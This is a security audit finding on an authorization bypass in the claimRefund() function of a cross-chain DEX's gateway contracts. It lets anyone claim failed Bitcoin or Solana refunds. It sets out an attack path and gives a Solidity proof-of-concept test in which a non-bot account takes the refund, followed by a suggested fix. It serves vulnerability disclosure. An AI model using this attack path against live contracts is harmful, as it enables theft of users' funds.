# Unauthorized Users Can Steal Bitcoin/Solana Refunds Through Authorization Bypass

### Summary

A flawed authorization check in the `claimRefund()` function will cause fund theft for Bitcoin and Solana users as any attacker will bypass access controls by exploiting the logical error where `msg.sender == receiver` always evaluates to true for non-EVM addresses.

### Root Cause

In [GatewayCrossChain.sol:claimRefund()](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571-L579) and [GatewayTransferNative.sol:claimRefund()](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L661-L669) the authorization logic contains a flaw where for non-EVM addresses (Bitcoin/Solana), the `receiver` variable remains set to `msg.sender` (the attacker), making the condition `msg.sender == receiver` always true, completely bypassing the intended bot-only authorization for non-EVM refunds.

### Internal Pre-conditions

1. A cross-chain transaction needs to fail, creating a refund via `onAbort()` or `onRevert()`
2. The refund needs to be for a non-EVM address (Bitcoin/Solana with walletAddress.length != 20 bytes)
3. The refund needs to contain tokens of value that attackers want to steal

### External Pre-conditions

1. Bitcoin or Solana users need to initiate cross-chain transactions through the bridge
2. Network conditions or other factors need to cause transaction failures, triggering refund creation

### Attack Path

1. Attacker monitors blockchain for `EddyCrossChainRefund` events containing non-EVM addresses
2. Attacker identifies refunds with `walletAddress.length != 20` (Bitcoin/Solana addresses)
3. Attacker calls `claimRefund(externalId)` for the target refund
4. Authorization check `require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER")` evaluates to `require(false || true, "INVALID_CALLER")` and passes
5. Attacker receives the refund tokens intended for the legitimate Bitcoin/Solana user

### Impact

Bitcoin and Solana users suffer 100% loss of their refunded tokens. The attacker gains the full refund amount with zero cost or risk. This affects all non-EVM cross-chain transactions that fail and require refunds, potentially resulting in systematic theft of all Bitcoin and Solana user funds during failed transactions.

### PoC

```solidity
function test_UnauthorizedBitcoinRefundTheft() public {
    bytes32 externalId = keccak256(abi.encodePacked("btc_theft_test", block.timestamp));
    uint256 refundAmount = 100 ether;
    
    // Setup: Create Bitcoin refund
    token1Z.mint(address(gatewayCrossChain), refundAmount);
    vm.prank(address(gatewayZEVM));
    gatewayCrossChain.onAbort(
        AbortContext({
            sender: abi.encode(address(this)),
            asset: address(token1Z),
            amount: refundAmount,
            outgoing: false,
            chainID: 8332, // Bitcoin
            revertMessage: bytes.concat(externalId, btcAddress) // >20 bytes
        })
    );
    
    // Attack: Unauthorized user steals Bitcoin refund
    uint256 attackerBefore = token1Z.balanceOf(user1);
    vm.prank(user1); // user1 is NOT a bot
    gatewayCrossChain.claimRefund(externalId); // Should fail but succeeds
    
    // Verify theft
    uint256 attackerAfter = token1Z.balanceOf(user1);
    assertEq(attackerAfter - attackerBefore, refundAmount); // Attacker gained 100 tokens
}
```

### Mitigation

Fix the authorization logic to properly handle non-EVM addresses:

1. Separate authorization logic for EVM vs non-EVM addresses
2. Enforce bot-only claims for non-EVM addresses
3. Remove the flawed `msg.sender == receiver` check for non-EVM cases

```solidity

function claimRefund(bytes32 externalId) external {
    RefundInfo storage refundInfo = refundInfos[externalId];
    require(refundInfo.externalId != "", "REFUND_NOT_EXIST");

    if(refundInfo.walletAddress.length == 20) {
        // EVM address - user can claim directly
        address receiver = address(uint160(bytes20(refundInfo.walletAddress)));
        require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");
        TransferHelper.safeTransfer(refundInfo.token, receiver, refundInfo.amount);
    } else {
        // Non-EVM address - only authorized bots can claim
        require(bots[msg.sender], "ONLY_BOTS_FOR_NON_EVM");
        // Implement additional verification mechanism for bot claims
        TransferHelper.safeTransfer(refundInfo.token, msg.sender, refundInfo.amount);
    }
    
    delete refundInfos[externalId];
    
    emit EddyCrossChainRefundClaimed(
        externalId,
        refundInfo.token,
        refundInfo.amount,
        abi.encodePacked(msg.sender)
    );
}
```
